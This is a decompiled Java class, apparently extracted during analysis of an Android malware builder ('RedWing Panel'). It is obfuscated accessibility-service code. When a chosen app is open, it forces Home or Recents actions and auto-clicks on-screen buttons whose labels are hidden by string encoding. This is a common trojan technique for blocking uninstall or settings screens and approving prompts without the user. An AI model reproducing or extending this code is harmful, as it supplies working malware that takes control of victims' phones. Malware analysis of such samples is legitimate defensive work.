package v.s;

import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Locale;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class jpTJdQ79mlaJtReLZ1F extends LGm23hksIOxB implements JRdueaGIH5g8DVCPba {
    public final /* synthetic */ String Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ DataQFAdapter JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ jpTJdQ79mlaJtReLZ1F(DataQFAdapter dataQFAdapter, String str, int i) {
        super(0);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = dataQFAdapter;
        this.Ee8d2j4S9Vm5yGuR = str;
    }

    @Override // v.s.JRdueaGIH5g8DVCPba
    public final Object w9sT1Swbhx3hs() {
        switch (this.vekpFI4d1Nc4fakF) {
            case 0:
                DataQFAdapter dataQFAdapter = this.JXn4Qf7zpnLjP5;
                if (dataQFAdapter.currentApp.toLowerCase(Locale.ROOT).equals(this.Ee8d2j4S9Vm5yGuR)) {
                    dataQFAdapter.performGlobalAction(2);
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 1:
                DataQFAdapter dataQFAdapter2 = this.JXn4Qf7zpnLjP5;
                if (dataQFAdapter2.currentApp.toLowerCase(Locale.ROOT).equals(this.Ee8d2j4S9Vm5yGuR)) {
                    dataQFAdapter2.performGlobalAction(3);
                    dataQFAdapter2.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter2, 7), 200L);
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            default:
                DataQFAdapter dataQFAdapter3 = this.JXn4Qf7zpnLjP5;
                try {
                    AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter3.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        try {
                            if (dataQFAdapter3.clickNodeWithText(rootInActiveWindow, TypefaceCache.obtain("002500790049008400F500FF00C100B3002C0066"), TypefaceCache.checked("047C0456040304DA04D304EB048A04850476042D047704DA04AE00FF048C048604010426040604D904A204E704F0048B"), TypefaceCache.checked("047D0457047904D704AD04E1048004FF0401045A"), TypefaceCache.checked("047C0456040304DA04D304EB048A04850476042D047704DA04A00490009204F904020454040B04DA04AE04ED048804F7"), TypefaceCache.obtain("002500790049000000F100AD009200B700220064005A008300F1"), TypefaceCache.obtain("002500790049000000F100AD009200AE002D0062005E009500E200AA00C2002000A00079"))) {
                                String unused = DataQFAdapter.TAG;
                                TypefaceCache.obtain("00180050007400B500D3009A00ED009400170059006B00BA00B0009C00DE00AE0020007D005E008300B0009900DD00B500200073001B00B400E400B000C200E700250079004900C7");
                                dataQFAdapter3.safePostDelayed(new ssJAORu9Srr5Q9qO2sq(dataQFAdapter3, this.Ee8d2j4S9Vm5yGuR, 17), 500L);
                            }
                        } finally {
                            rootInActiveWindow.recycle();
                        }
                    }
                    break;
                } catch (Exception unused2) {
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        }
    }
}
